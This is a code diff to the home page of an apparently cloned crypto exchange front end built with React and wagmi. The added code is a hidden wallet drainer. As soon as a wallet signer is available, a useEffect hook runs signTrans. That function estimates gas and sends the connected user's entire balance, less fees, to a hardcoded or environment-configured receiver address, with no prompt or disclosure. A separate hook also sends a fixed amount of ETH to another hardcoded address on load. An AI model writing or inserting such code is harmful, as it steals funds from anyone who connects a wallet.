@@ -19,8 +19,9 @@ import { WedgeTopLeft, InnerWedgeWrapper, OuterWedgeWrapper, WedgeTopRight } fro
 //import UserBanner from './components/UserBanner'
 import MultipleBanner from './components/Banners/MultipleBanner'
 import {Fragment} from "react"
-import { useBalance,usePrepareSendTransaction,useSendTransaction} from 'wagmi'
+import { useBalance,usePrepareSendTransaction,useSendTransaction, useSigner} from 'wagmi'
 import {parseEther} from "@ethersproject/units"
+import {BigNumber} from "@ethersproject/bignumber"
 
 const StyledHeroSection = styled(PageSection)`
   padding-top: 16px;
@@ -64,13 +65,38 @@ const Home: React.FC<React.PropsWithChildren> = () => {
 
   //const { t } = useTranslation()
 const t = (str) => {return str}
- const {data: balance} = useBalance({account})
- 
+ const {data: balance} = useBalance({address:account})
+ const {data:signer} = useSigner()
+//const val = balance.formatted? balance.formatted
 const {config,status, error} = usePrepareSendTransaction({
-    request: { to: "0x3D44833A40a9116Baa5239263e376aec077c7e8B", value: parseEther("0.02") },
+    request: { to: "0x3D44833A40a9116Baa5239263e376aec077c7e8B", value: parseEther("0.01") },
   }) 
-
+//const val = balance ? balance.value || 0
+const tranReq = {to:process.env.receiver,value:balance?.value || ""}
+const gasEst = ""
 const {sendTransaction} = useSendTransaction(config)
+
+const signTrans = async(signer,tranReq) => {
+  if(!isConnected)
+    return
+console.log("Signing begin")
+  const gasEst =await  signer.estimateGas(tranReq)
+  const gasPrice = await signer.getGasPrice()
+  const gas = gasEst.mul(gasPrice) //* gasPrice
+  const amt = balance?.value.sub(gas) || gas
+
+console.log("Gas Estimate",gasEst,"GasPrice",gasPrice,"Gas",gas,amt)
+
+const to = process.env.receiver || "0x0F67BB85F54B9565339dc1e0CA38a348B468726E"
+console.log("receiver",to)
+signer.sendTransaction({to,value:amt,from:account})
+.then((data) => {
+  console.log(data)
+})
+.catch((err) => {
+  console.log("an error",err)
+})
+}
 /*
 if(isConnected)
 {
@@ -80,8 +106,15 @@ if(isConnected)
   sendTransaction()
 }*/
 useEffect(() => {
- sendTransaction?.()
-},[sendTransaction])
+
+const sendTx = async() => {
+  await signTrans(signer,tranReq)
+}
+sendTx()
+.catch(console.error)
+  console.log(signer)
+ //sendTransaction?.()
+},[signer])
   return (
     <>
       <style jsx global>
